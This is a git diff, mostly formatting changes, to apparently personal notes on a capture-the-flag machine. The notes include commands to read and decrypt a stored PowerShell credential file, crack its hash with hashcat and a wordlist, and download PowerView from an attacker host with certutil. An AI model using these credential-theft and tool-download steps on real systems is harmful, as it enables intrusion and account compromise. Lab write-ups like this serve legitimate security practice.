@@ -1,5 +1,3 @@
-export IP=10.129.1.151
-
 ### FTP
 ```bash
 ftp $IP
@@ -93,6 +91,7 @@ sendEmail -f foo@megabank.com -t nico@megabank.com -u "U hello" -m "M goodbye" -
 ##### metasploit method 2 meterpreter with Empire (offical writeup)
 
 # Foothold
+```
 c:\Users\nico\Desktop>type cred.xml
 type cred.xml
 <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
@@ -108,20 +107,30 @@ type cred.xml
     </Props>
   </Obj>
 </Objs>
-https://hashes.com/en/tools/hash_identifier
-https://hashcat.net/wiki/doku.php?id=example_hashes
+```
+* https://hashes.com/en/tools/hash_identifier
+* https://hashcat.net/wiki/doku.php?id=example_hashes
 
 ```bash
 hashcat -m 12900 --force -a 0 tom.hash /usr/share/wordlists/rockyou.txt
 ```
 
 a little offset invest
+```
 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692
-
-
-000000000000000000000000000000000000000000000000000000038421854118412625768408160477112384218541184126257684081604771129b6258eb22fc8b9d08e04e6450f72b98725d7d4fcad6fb6aec4ac2a79d0c6ff738421854118412625768408160477112 
+```
+```
+000000000000000000000000000000000000000000000000000000038421854118412625768408160477112384218541184126257684081604771129b6258eb22fc8b9d08e04e6450f72b98725d7d4fcad6fb6aec4ac2a79d0c6ff738421854118412625768408160477112
+```
 
 ### PSCredential is the better way to do it
+PowerShell has a method for storing encrypted credentials that can only be accessed by the user account that stored them. To retrieve the credential and using it within a script, you read it from the XML file. We will use this method to get the user’s hash.
+
+```
+PS C:\Users\lvetrova> $Credential = Import-Clixml -Path "lvetrova.xml"
+
+PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
+```
 ```c:\ rev
 powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
 ```
@@ -149,4 +158,4 @@ BloodHound not working.
 
 I'll just go with powerview.
 
-certutil -urlcache -f http://10.10.16.13/powerview.ps1 powerview.ps1
+`certutil -urlcache -f http://10.10.16.13/powerview.ps1 powerview.ps1`
